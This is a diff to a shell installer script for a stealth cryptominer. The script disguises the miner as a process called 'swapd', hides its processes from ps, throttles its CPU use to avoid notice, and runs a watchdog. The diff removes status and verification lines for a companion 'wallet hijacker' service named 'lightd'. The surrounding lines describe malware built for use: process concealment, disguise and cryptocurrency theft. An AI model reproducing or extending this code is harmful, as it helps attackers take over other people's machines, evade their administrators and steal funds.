@@ -2641,12 +2641,6 @@ else
     echo '  ○ Watchdog: Not deployed'
 fi
 
-if [ -f /usr/local/bin/lightd ]; then
-    echo '  ✓ Smart Wallet Hijacker: ACTIVE (detects -c flag in processes)'
-else
-    echo '  ○ Wallet Hijacker: Not deployed'
-fi
-
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
 echo '  ✓ Process name: swapd'
 echo '  ✓ Binary structure: direct binary /root/.swapd/swapd (no symlink/wrapper)'
@@ -2698,11 +2692,6 @@ if proc_pids swapd | grep -q . 2>/dev/null; then
     echo '[⚠] WARNING: Miner processes are STILL VISIBLE in ps output!'
 fi
 
-if proc_pids lightd | grep -q . 2>/dev/null; then
-    PROCESSES_VISIBLE=true
-    echo '[⚠] WARNING: Wallet hijacker is STILL VISIBLE in ps output!'
-fi
-
 if [ "$PROCESSES_VISIBLE" = true ]; then
     echo ''
     echo 'This can happen if services were already running before installation.'
@@ -2713,25 +2702,20 @@ if [ "$PROCESSES_VISIBLE" = true ]; then
     echo ''
     echo '  Option 2 - Restart services manually:'
     echo '    systemctl restart swapd'
-    echo '    systemctl restart lightd'
     echo ''
     echo 'After restart, verify with:'
     echo '  ps aux | grep swapd      # Should show nothing'
-    echo '  ps aux | grep lightd    # Should show nothing'
     echo ''
     echo 'Check services are running with:'
     echo '  systemctl status swapd   # Should show: active (running)'
-    echo '  systemctl status lightd # Should show: active (running)'
 else
     echo '[✓] SUCCESS! All processes are HIDDEN from ps output!'
     echo ''
     echo 'Verification:'
     echo '  ps aux | grep swapd      → Nothing (hidden) ✓'
-    echo '  ps aux | grep lightd    → Nothing (hidden) ✓'
     echo ''
     echo 'Services are running (verify with):'
     echo '  systemctl status swapd   → active (running) ✓'
-    echo '  systemctl status lightd → active (running) ✓'
 fi
 
 echo ''
